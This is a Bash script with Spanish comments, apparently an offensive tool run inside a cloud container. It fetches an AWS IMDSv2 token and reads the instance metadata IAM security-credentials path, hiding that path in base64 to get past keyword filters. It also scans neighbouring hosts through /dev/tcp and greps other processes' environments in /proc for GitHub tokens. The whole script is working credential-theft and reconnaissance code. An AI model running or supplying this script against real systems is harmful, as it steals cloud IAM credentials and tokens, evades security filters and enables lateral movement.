#!/bin/bash

# Colores para legibilidad
G='\033[0;32m'
R='\033[0;31m'
NC='\033[0m'

echo -e "${G}--- 1. DETECCIÓN DE PROXY (ANÁLISIS DE HEADERS) ---${NC}"
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Función para analizar quién responde
analizar_cabeceras() {
    local url=$1
    echo -e "\n[+] Analizando: $url"
    # Capturamos cabeceras y buscamos firmas conocidas
    local headers=$(curl -s -I -H "X-aws-ec2-metadata-token: $TOKEN" "$url")
    echo "$headers" | grep -iE "Server|Via|X-Cache|X-Forwarded|Proxy-Connection"
    
    if echo "$headers" | grep -iq "Server: EC2ws"; then
        echo -e "${G}[!] CONFIRMADO: Responde Amazon EC2 directamente.${NC}"
    elif echo "$headers" | grep -iqE "nginx|squid|apache|varnish|cloudflare"; then
        echo -e "${R}[!] ALERTA: Proxy/WAF detectado interponiéndose.${NC}"
    fi
}

analizar_cabeceras "http://169.254.169.254/latest/meta-data/"
analizar_cabeceras "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

echo -e "\n${G}--- 2. BYPASS DE PALABRAS CLAVE (Ofuscación Base64) ---${NC}"
# Intentamos acceder a IAM construyendo la cadena en memoria
IAM_B64="aWFtL3NlY3VyaXR5LWNyZWRlbnRpYWxzLw==" # iam/security-credentials/
PATH_DECODED=$(echo "$IAM_B64" | base64 -d)

echo "[+] Intentando acceso ofuscado a: $PATH_DECODED"
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/$PATH_DECODED"

echo -e "\n${G}--- 3. ESCANEO DE RED (Identificando vecinos) ---${NC}"
# Escaneamos el segmento actual para ver si hay otros contenedores/servicios
MY_IP=$(hostname -I | awk '{print $1}')
echo "Mi IP: $MY_IP"
SUBNET=$(echo $MY_IP | cut -d'.' -f1-3)

for i in {1..15}; do
    (timeout 0.2 bash -c "echo > /dev/tcp/$SUBNET.$i/80" 2>/dev/null && echo -e "${G}IP $SUBNET.$i:80 ABIERTO${NC}") &
    (timeout 0.2 bash -c "echo > /dev/tcp/$SUBNET.$i/7007" 2>/dev/null && echo -e "${G}IP $SUBNET.$i:7007 ABIERTO${NC}") &
done
wait

echo -e "\n${G}--- 4. EXFILTRACIÓN DE DATOS DE PROCESO ---${NC}"
# Buscamos tokens de Git o secretos en las variables de entorno de otros procesos
# Si podemos leer /proc, podemos ver el entorno de otros contenedores si no hay aislamiento
grep -oaE "ghp_[a-zA-Z0-9]{36}" /proc/*/environ 2>/dev/null | head -n 5 || echo "No se encontraron tokens de GitHub en procesos."
